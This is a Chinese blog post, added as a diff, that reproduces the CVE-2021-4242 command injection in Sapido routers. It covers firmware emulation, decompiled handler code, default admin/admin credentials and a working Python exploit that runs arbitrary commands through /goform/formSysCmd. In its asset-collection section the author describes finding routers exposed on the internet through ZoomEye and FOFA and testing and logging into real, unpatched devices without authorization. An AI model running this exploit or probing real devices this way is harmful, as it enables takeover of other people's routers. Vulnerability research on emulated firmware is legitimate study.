@@ -1,0 +1,294 @@
+---
+title: "Sapido RB-1732 路由器 RCE 漏洞"
+published: 2025-11-15
+updated: 2025-11-15
+description: "CVE-2021-4242: Sapido RB-1732 路由器 RCE 漏洞复现。"
+image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.7ppukt57t.avif"
+tags: ["Pwn", "IoT"]
+category: "IoT"
+draft: false
+---
+
+# 前言
+
+所以，这是我入门 IoT 复现的第一个漏洞 \:D
+
+看到 Arch Linux ~~神（邪）教~~被孤立还是很难过的……最后迫不得已，还是搭建了 [AttifyOS](https://www.attify.com/) 虚拟机，老老实实用它仿真，不过分析和写 exp 这种事情还是在宿主机进行，其实感觉还好，整个流程并没有让我觉得有多麻烦。
+
+~~嗯……有空研究一下市面上仿真项目的源码，然后写一个适用于 arch 的仿真工具孤立所有非我教者（~~
+
+# 漏洞介绍
+
+好了，不瞎扯了，说点正经的……搜了一下，这个漏洞的 CVE 是：[CVE-2021-4242](https://nvd.nist.gov/vuln/detail/CVE-2021-4242)，说实话一开始以为是一个很老的漏洞，没想到也就近几年。
+
+对于这个洞的描述是：
+
+> A vulnerability was found in Sapido BR270n, BRC76n, GR297 and RB1732 and classified as critical. Affected by this issue is some unknown functionality of the file ip/syscmd.htm. The manipulation leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-214592.
+
+说白了就是一个没有过滤后门页面的访问的问题，虽然洞很简单，但这里主要是为了学习，体会实战中如何寻找漏洞的一个思路，而不是为了复现而复现。
+
+# 固件仿真
+
+~~仿真还不是 easy peasy，只要人品足够好，不是吗？~~
+
+这里我使用的是 [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)，直接梭掉了，没有遇到什么奇奇怪怪的问题。~~人品保障（~~
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.102lccjy0f.avif)
+
+为了方便测试，这里我写了一个无比简陋的端口转发脚本，这样就可以从宿主机访问仿真出来的路由器后端了：
+
+```bash
+#!/bin/bash
+
+TARGET_IP="$1"
+PORT_RULES="$2"
+
+if [[ -z "$TARGET_IP" || -z "$PORT_RULES" ]]; then
+  echo "usage: $0 <target_ip> \"<host_port:target_port> <host_port:target_port> ...\""
+  exit 1
+fi
+
+if ! command -v socat >/dev/null 2>&1; then
+  echo "[-] socat not found."
+  exit 1
+fi
+
+echo "[*] Target IP: $TARGET_IP"
+echo "[*] Rules: $PORT_RULES"
+echo
+
+for rule in $PORT_RULES; do
+  HOST_PORT="${rule%%:*}"
+  TARGET_PORT="${rule##*:}"
+
+  echo "[+] Forwarding host: $HOST_PORT → $TARGET_IP:$TARGET_PORT"
+
+  socat TCP-LISTEN:"$HOST_PORT",fork TCP:"$TARGET_IP":"$TARGET_PORT" &
+
+  PID=$!
+  echo "    Started (PID=$PID)"
+done
+
+echo
+echo "[OK] All forwarding rules loaded."
+```
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.5mo8d3awk8.avif)
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.7w78wkztpt.avif)
+
+# 漏洞分析
+
+闭眼 `binwalk`，~~幸运女神保佑我，别加密，别加密（~~
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.7eh780c9a3.avif)
+
+正合我意，是没有加密的 SquashFS 文件系统。下面随机抓一个倒霉蛋问问架构：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.4g4x4iaxdu.avif)
+
+Well，32-bit 大端 MIPS，现在基本的信息算是搜集的差不多了，接下来就应该去分析它是如何把 http 服务跑起来的了。
+
+我们发现 `/etc/init.d` 下有三个文件，`rcS`、`rcS_16M` 和 `rcS_32M`，盲猜后两个是设计用于特定内存大小使用的，我们直接看 `rcS` 就好了，另外两个也大差不差。
+
+快速过一遍这个脚本，大致可以看出来就是做了一些初始化工作，诸如网络设置，硬件检测啦之类的事情，最后，我们凭借敏锐的注意力发现它在一切准备就绪后执行了一个叫做 `webs` 的程序：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.3uv9i7vgzk.avif)
+
+盲猜这个路由器就是通过它来启服务的。找到入口后，发现是 ELF 文件，那就丢给 IDA 姐姐分析一下看看它偷偷摸摸地在幕后做了些什么坏坏的事情（
+
+~~然后发现已经快凌晨四点了，这说明白天睡觉的效益并不大，早岁晚起才是真理（~~
+
+粗略看了一下，就是很常规的启动 web 服务器，注册 `cgi-bin` 和 `goform` handlers 用于执行实际操作：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.86u2q7x1v4.avif)
+其中有一个疑似后门的 form handler：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.2vf65igjir.avif)
+
+直接进入函数分析分析它到底干了点啥：
+
+```c {23} del={28-32} collapse={1-19, 35-95}
+int __fastcall formSysCmd(int a1)
+{
+  int Var; // $s4
+  const char *v3; // $s1
+  _BYTE *v4; // $s5
+  int v5; // $s6
+  const char *p_writepath; // $s3
+  _BYTE *v7; // $s7
+  int v8; // $v0
+  _DWORD *v9; // $s0
+  int v10; // $a0
+  const char *Var_1; // $a1
+  int v12; // $v0
+  int v13; // $s1
+  void (__fastcall *p_fputc)(int, _DWORD *); // $t9
+  _BYTE *v15; // $a0
+  _BYTE *v16; // $a3
+  int v17; // $a0
+  int v18; // $v0
+  char p_writepath_1[104]; // [sp+20h] [-68h] BYREF
+
+  Var = websGetVar(a1, "submit-url", &dword_47F498);
+  v3 = (const char *)websGetVar(a1, "sysCmd", &dword_47F498);
+  v4 = (_BYTE *)websGetVar(a1, "writeData", &dword_47F498);
+  v5 = websGetVar(a1, "filename", &dword_47F498);
+  p_writepath = (const char *)websGetVar(a1, "fpath", &dword_47F498);
+  v7 = (_BYTE *)websGetVar(a1, "readfile", &dword_47F498);
+  if ( *v3 )
+  {
+    snprintf(p_writepath_1, 100, "%s 2>&1 > %s", v3, "/tmp/syscmd.log");
+    system(p_writepath_1);
+  }
+  if ( *v4 )
+  {
+    strcpy(p_writepath_1, p_writepath);
+    strcat(p_writepath_1, v5);
+    v8 = fopen(p_writepath_1, "w");
+    v9 = (_DWORD *)v8;
+    if ( !v8 )
+    {
+      printf("Open %s fail.\n", p_writepath_1);
+      v10 = a1;
+      Var_1 = (const char *)Var;
+      return websRedirect(v10, Var_1);
+    }
+    v13 = 0;
+    v12 = fileno(v8);
+    fchmod(v12, 511);
+    if ( *(int *)(a1 + 240) > 0 )
+    {
+      while ( 1 )
+      {
+        p_fputc = (void (__fastcall *)(int, _DWORD *))&fputc;
+        if ( !v9[13] )
+          break;
+        v15 = (_BYTE *)v9[4];
+        p_fputc = (void (__fastcall *)(int, _DWORD *))&_fputc_unlocked;
+        v16 = (_BYTE *)(*(_DWORD *)(a1 + 204) + v13);
+        if ( (unsigned int)v15 >= v9[7] )
+        {
+          v17 = (char)*v16;
+LABEL_12:
+          p_fputc(v17, v9);
+          goto LABEL_13;
+        }
+        *v15 = *v16;
+        v9[4] = v15 + 1;
+LABEL_13:
+        if ( ++v13 >= *(_DWORD *)(a1 + 240) )
+          goto LABEL_14;
+      }
+      v17 = *(char *)(*(_DWORD *)(a1 + 204) + v13);
+      goto LABEL_12;
+    }
+LABEL_14:
+    fclose(v9);
+    printf("Write to %s\n", p_writepath_1);
+    strcpy(&writepath, p_writepath);
+  }
+  if ( *v7 && (v18 = fopen(p_writepath, "r")) != 0 )
+  {
+    fclose(v18);
+    sprintf(p_writepath_1, "cat %s > /web/obama.dat", p_writepath);
+    system(p_writepath_1);
+    usleep(10000);
+    v10 = a1;
+    Var_1 = "/obama.dat";
+  }
+  else
+  {
+    v10 = a1;
+    Var_1 = (const char *)Var;
+  }
+  return websRedirect(v10, Var_1);
+}
+```
+
+我们发现它获取了 `sysCmd` 后并构造了一个 `<sysCmd> 2>&1 > /tmp/syscmd.log` 指令，保存在 `p_writepath_1`，然后直接调用 `system(p_writepath_1)`。那我们如果可以控制 `sysCmd` 的话就能执行任意代码了，所以下面应该找一下哪里使用了这个 form。
+
+下面是使用 `ripgrep` 搜索的结果：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.icjoboa0g.avif)
+
+发现除了 `webs` 这个二进制文件外，还有 `web/syscmd.asp` 和 `web/obama.asp` 也包含了这个 form，直接跟进，对比发现这两个文件的区别就在于提供的功能数量，`obama.asp` 比 `syscmd.asp` 多提供了操作文件的功能，而我们最关心的 `sysCmd` 被定义为一个输入框，即我们可控它的内容：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.8vnca9oewj.avif)
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.b9bswhjgx.avif)
+
+# 漏洞利用
+
+上面有关这个 CVE 的漏洞分析的就差不多了，我们可以试试能不能直接访问 `syscmd.asp` 和 `obama.asp` 这两个页面，不过测试发现没登陆的情况下访问会被重定向回到登陆页面，网上搜到了这个路由器的默认账号密码是 `admin/admin`，用它登陆后再访问就进去了，发现和我们分析的一模一样，可以执行任意指令，并且 `obama.asp` 的功能更多：
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.39llwf4kv9.avif)
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.7axlat99wc.avif)
+
+btw 有些不同型号的是 `htm` 而不是 `asp`，这个可以自己测试一下。
+
+~~不过为什么要用美国总统的名字？？好奇怪呀……~~
+
+## 资产收集
+
+只是打本地多没意思，我们玩的可是实战。本来只是抱着试一试的心态尝试 `ZoomEye` 和 `FOFA` 看看能不能找到一别暴露在公网的服务，结果意外地搜出一堆……大家安全意识都那么薄弱的吗？而且测试发现大多数暴露在外的服务都没有修复这个漏洞，随便抓一个倒霉蛋发现甚至连默认账号密码都没改，有些甚至不用登陆就直接进管理面板了……
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.60uo4iuufg.avif)
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.3uv9ir36of.avif)
+
+## Exploit
+
+开开心心去写 exp 咯～
+
+```python
+#!/usr/bin/env python3
+
+import requests
+from pwn import log, sys
+
+
+def rce(host, port, cmd):
+    payload = {
+        "sysCmd": cmd,
+        "apply": "Apply",
+        "submit-url": "/obama.asp",
+    }
+
+    try:
+        r = requests.post(
+            f"http://{host}:{port}/goform/formSysCmd",
+            data=payload,
+            timeout=5,
+        )
+    except Exception as e:
+        log.error(f"HTTP request failed: {e}")
+
+    text = r.text
+    start_tag = '<textarea rows="15" name="msg" cols="80" wrap="virtual">'
+    end_tag = "</textarea>"
+
+    start = text.find(start_tag)
+    end = text.rfind(end_tag)
+
+    if start < 0 or end < 0:
+        log.warn("Output parsing failed.")
+        return text
+
+    return text[start + len(start_tag) : end]
+
+
+def main():
+    log.success(rce(sys.argv[1], sys.argv[2], sys.argv[3]))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+![](https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.73udfh0vwj.avif)
+
+# 后记
+
+至此，人生中第一个路由器 RCE 漏洞复现成功，我也算是真正步入 IoT 的世界了，不过说实话从这个漏洞中我可能并没有学到太多东西，只是对如何寻找漏洞，对常见路由器设备的架构以及其可能的攻击面有了一个粗略的了解吧，总的来说收获不是很大，但这个独自研究摸索的过程还是很快乐的。
